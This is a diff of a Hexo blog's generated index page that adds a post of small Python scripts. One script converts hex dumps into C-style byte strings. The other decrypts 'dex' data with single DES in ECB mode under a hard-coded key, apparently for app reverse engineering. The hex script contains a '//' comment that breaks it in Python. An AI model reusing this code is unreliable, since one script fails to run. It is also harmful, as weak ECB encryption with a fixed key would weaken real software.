-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">from pyDes import *</span><br><span class="line">import base64</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def DesEncrypt(str):</span><br><span class="line">    Des_Key = &apos;\x20\x1B\x2A\x01\x0E\x07\x3D\x08&apos;</span><br><span class="line">    print(Des_Key);</span><br><span class="line">    k = des(Des_Key, ECB)</span><br><span class="line">    EncryptStr = k.encrypt(str)</span><br><span class="line">    print(EncryptStr);</span><br><span class="line"> </span><br><span class="line">def Desdecrypt(str):</span><br><span class="line">    Des_Key = &apos;\x20\x1B\x2A\x01\x0E\x07\x3D\x08&apos;</span><br><span class="line">    print(Des_Key);</span><br><span class="line">    k = des(Des_Key, ECB)</span><br><span class="line">    decryptStr = k.decrypt(str)</span><br><span class="line">    print(decryptStr); </span><br><span class="line"> </span><br><span class="line">if __name__==&apos;__main__&apos;:</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    str=&apos;testmess&apos;</span><br><span class="line">    DesEncrypt(str)</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    str1 = &apos;\x2D\x6F\x3D\x14\x54\xBB\x45\xA7&apos;</span><br><span class="line">    Desdecrypt(str1)</span><br></pre></td></tr></table></figure>
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">python</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/04/09/python一些小脚本/">展开全文 >></a>
         </p>
       
 
@@ -761,21 +943,21 @@
         <!-- 目录内容结束 -->
 
   
-    <article id="post-为什么我会想要写下来" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-python一些小脚本" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2018/04/02/为什么我会想要写下来/">为什么我要开始写作</a>
+      <a class="article-title" href="/2018/04/09/python一些小脚本/">python一些小脚本</a>
     </h1>
   
 
 		
         
-        <a href="/2018/04/02/为什么我会想要写下来/" class="archive-article-date">
-  	<time datetime="2018-04-02T02:45:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-04-02</time>
+        <a href="/2018/04/09/python一些小脚本/" class="archive-article-date">
+  	<time datetime="2018-04-09T06:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-04-09</time>
 </a>
         
       </header>
@@ -783,173 +965,14 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>从我个人而言，我有以下几个目的希望能通过写作来完成。<br></p>
-        
-          <a class="article-more-a" href="/2018/04/02/为什么我会想要写下来/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">思考</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/04/02/为什么我会想要写下来/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
- <!-- 目录内容 -->
-             
-        <!-- 目录内容结束 -->
-
-  
-    <article id="post-偶尔一次幻想" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/03/25/偶尔一次幻想/">偶尔的一次幻想</a>
-    </h1>
-  
-
-		
-        
-        <a href="/2018/03/25/偶尔一次幻想/" class="archive-article-date">
-  	<time datetime="2018-03-25T06:19:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-03-25</time>
-</a>
-        
-      </header>
-
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>幻想着中午吃完饭,躺在摇椅上。暖风微微拂过，带来一丝倦意，带着这丝倦意，不知不觉睡下去。然后在睡眼朦胧中醒来，拿起一本历史或者哲学书。摇着摇椅，伴着暖风，伴着树叶沙沙的声响，时而陷入思考，时而懒懒的翻着书。周末的一下午就这么轻松的过去。幻想着，幻想着，然后情不自禁乐了一下。</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">随笔</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2018/03/25/偶尔一次幻想/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
- <!-- 目录内容 -->
-             
-        <!-- 目录内容结束 -->
-
-  
-    <article id="post-linux网络" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/03/25/linux网络/">linux网络相关</a>
-    </h1>
-  
-
-		
-        
-        <a href="/2018/03/25/linux网络/" class="archive-article-date">
-  	<time datetime="2018-03-25T06:19:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-03-25</time>
-</a>
-        
-      </header>
-
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>网络设置:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">centos:</span><br><span class="line">  /etc/sysconfig/network-scripts/ifcfg-*</span><br><span class="line">  ifup #开启某个网卡</span><br><span class="line">  ifdown #关闭某个网卡</span><br><span class="line">  service network start/stop/restart</span><br><span class="line">debian:</span><br><span class="line">  /etc/network/interface</span><br><span class="line">  service networking restart/start/stop</span><br></pre></td></tr></table></figure></p>
-<blockquote>
-<p>netstat</p>
+        <blockquote>
+<p>16进制数字转C++字符串</p>
 </blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -tulnp | grep port #获取端口占用</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">str2 = &apos;&apos;&apos;</span><br><span class="line">08 26 00 02 3A 0E 20 10 27 23 24 00 31 04 00 04 34 28 04 00 26 2B 00 20 13 16 24 00 3F 00 08 00</span><br><span class="line">11 38 20 01 00 1F 00 20 0E 34 20 00 15 30 09 20 0C 0B 00 05 0E 03 08 20 25 05 00 01 13 3C 0D 00</span><br><span class="line">04 3F 10 20 21 1A 00 08 3A 0E 10 00 16 08 00 03 07 11 18 20 30 2B 00 01 32 24 00 20 0B 33 00 03</span><br><span class="line">0D 1C 08 20 2D 05 20 02 10 29 08 02 13 24 00 02 25 1A 08 00 1C 32 30 00 29 1D 00 00 0A 09 02 04</span><br><span class="line">00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">import sys</span><br><span class="line">list1 = str2.split(); //不填参数默认去除空格,换行,制表符</span><br><span class="line">count = 0;</span><br><span class="line">sys.stdout.write(&apos;&quot;&apos;);</span><br><span class="line">for i in list1:</span><br><span class="line">    sys.stdout.write(&quot;\\x&quot; + i);</span><br><span class="line">    count = count + 1;</span><br><span class="line">    if(count &gt;=32):</span><br><span class="line">        sys.stdout.write(&apos;&quot;\n&quot;&apos;);</span><br><span class="line">        count = 0;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>dex加密解密</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">from pyDes import *</span><br><span class="line">import base64</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def DesEncrypt(str):</span><br><span class="line">    Des_Key = &apos;\x20\x1B\x2A\x01\x0E\x07\x3D\x08&apos;</span><br><span class="line">    print(Des_Key);</span><br><span class="line">    k = des(Des_Key, ECB)</span><br><span class="line">    EncryptStr = k.encrypt(str)</span><br><span class="line">    print(EncryptStr);</span><br><span class="line"> </span><br><span class="line">def Desdecrypt(str):</span><br><span class="line">    Des_Key = &apos;\x20\x1B\x2A\x01\x0E\x07\x3D\x08&apos;</span><br><span class="line">    print(Des_Key);</span><br><span class="line">    k = des(Des_Key, ECB)</span><br><span class="line">    decryptStr = k.decrypt(str)</span><br><span class="line">    print(decryptStr); </span><br><span class="line"> </span><br><span class="line">if __name__==&apos;__main__&apos;:</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    str=&apos;testmess&apos;</span><br><span class="line">    DesEncrypt(str)</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    str1 = &apos;\x2D\x6F\x3D\x14\x54\xBB\x45\xA7&apos;</span><br><span class="line">    Desdecrypt(str1)</span><br></pre></td></tr></table></figure>
       
 
       
@@ -962,7 +985,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">linux</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">python</a>
         		</li>
       		
 		</ul>
@@ -972,7 +995,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2018/03/25/linux网络/">展开全文 >></a>
+          <a class="article-more-a" href="/2018/04/09/python一些小脚本/">展开全文 >></a>
         </p>
       
 
@@ -1103,11 +1126,31 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">linux优化</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">逆向</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">汇编</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">Window编程原理</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">linux</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">Java</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">Windbg</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1123,19 +1166,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">Windbg</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">shellcode</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">hexo</a>
+                <a href="javascript:void(0)" class="js-tag color4">git</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">git</a>
+                <a href="javascript:void(0)" class="js-tag color5">hexo</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1147,10 +1186,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">汇编</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">vsfptd</a>
               </li>
              
@@ -1159,11 +1194,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">逆向</a>
+                <a href="javascript:void(0)" class="js-tag color2">sqlmap</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">加壳</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">web安全</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1172,10 +1211,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">漏洞分析</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">sqlmap</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1207,23 +1242,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">网络协议</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">深入理解计算机系统</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">随记</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">网络协议</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">linux优化</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">Java</a>
               </li>
             
             <div class="clearfix"></div>
